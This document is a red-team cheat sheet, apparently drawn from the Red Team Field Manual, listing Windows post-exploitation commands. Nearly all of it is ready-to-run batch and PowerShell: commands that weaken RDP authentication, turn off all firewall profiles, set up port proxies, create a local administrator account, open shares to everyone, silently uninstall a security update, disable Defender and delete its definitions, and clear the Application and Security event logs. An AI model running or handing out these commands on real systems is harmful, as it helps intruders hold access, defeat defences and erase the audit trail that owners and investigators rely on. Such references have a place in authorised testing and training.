---
name: Windows Configuration
category: Post-Exploitation & PrivEsc
description: Windows reconfiguration — RDP, firewall, Defender, port forwarding, account creation, event logs.
tags: [windows, rdp, defender, firewall, configuration, RTFM]
---

# Windows Configuration

Reconfiguration commands for red team operations — RDP, firewall, Defender, port forwarding and event log manipulation.

## Enable RDP

```batch
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=yes
sc start TermService
```

Change RDP port:

```batch
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 443 /f
```

## Misc reconfiguration

```batch
rundll32 user32.dll,LockWorkStation
netsh advfirewall set currentprofile state off
netsh advfirewall set allprofiles state off
netsh interface portproxy add v4tov4 listenport=3000 listenaddress=1.1.1.1 connectport=4000 connectaddress=2.2.2.2
netsh interface portproxy delete v4tov4 listenport=3000 listenaddress=1.1.1.1
reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v IPEnableRouter /t REG_DWORD /d 1 /f
net share sharename=<SHARE> /GRANT:everyone,FULL
net user <USER> <PASS> /ADD
net localgroup "Administrators" <USER> /ADD
wusa /uninstall /kb:4516059 /quiet
```

## Disable Windows Defender

```batch
sc config WinDefend start= disabled
sc stop WinDefend
```

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Event viewer manipulation

```batch
wevtutil cl Application /bu:<FILE>.evtx
wevtutil qe Application /c:20 /rd:true /f:text
wevtutil qe security /q:"*[System[(EventID=4624)]]" /c:100 /rd:true
```

```powershell
$date = (Get-Date).AddHours(-24); Get-WinEvent -FilterHashTable @{logname="Security"; STARTTIME=$date; ID=4624}
Get-EventLog -list
Clear-EventLog -LogName Application, Security
```

> Source: RTFM — Red Team Field Manual v2
